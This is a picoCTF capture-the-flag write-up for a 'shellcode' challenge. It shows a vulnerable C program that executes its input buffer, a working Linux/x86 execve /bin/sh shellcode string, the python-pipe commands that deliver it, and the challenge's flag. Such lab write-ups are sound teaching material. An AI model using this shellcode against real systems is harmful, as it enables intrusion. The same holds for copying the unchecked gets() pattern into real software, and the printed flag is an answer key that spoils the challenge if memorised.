# shellcode
## Question
>This [program](files/vuln) executes any input you give it. Can you get a shell? You can find the program in `/problems/shellcode_3_09e0c5074980877d900d65c545d1e127` on the shell server. [Source](files/vuln.c).

## Hint
>Maybe try writing some shellcode?

>You also might be able to find some good shellcode online.

# Solution
The code doesn't do anything special. It is waiting for a user input and then displays it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

Let's find a shellcode to run a shell. Go to this [website](http://shell-storm.org/shellcode/) and get a shellcode that is relevant to the target platform (Linux/x86) and that does what we're looking for (a shell). This [one](http://shell-storm.org/shellcode/files/shellcode-827.php) looks good. Let's extract the shellcode:

~~~~
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
~~~~

Now, we want to send this payload to `vuln` as user input, so let's try that:
~~~~
$ **python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'" | ./vuln **
Enter a string!
1�Ph//shh/bin��PS��

Thanks! Executing now...
~~~~

It says that this is executing, but the program immediately closes. This is because we are capturing the input that the shell is waiting to receive. To fix that, let's execute `cat` just after:
~~~~
$ **(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"; cat) | ./vuln **
Enter a string!
1�Ph//shh/bin��PS��

Thanks! Executing now...
**ls**
flag.txt  vuln	vuln.c
**cat flag.txt**
picoCTF{shellc0de_w00h00_7f5a7309}
^C
~~~~

# Flag
`picoCTF{shellc0de_w00h00_7f5a7309}`
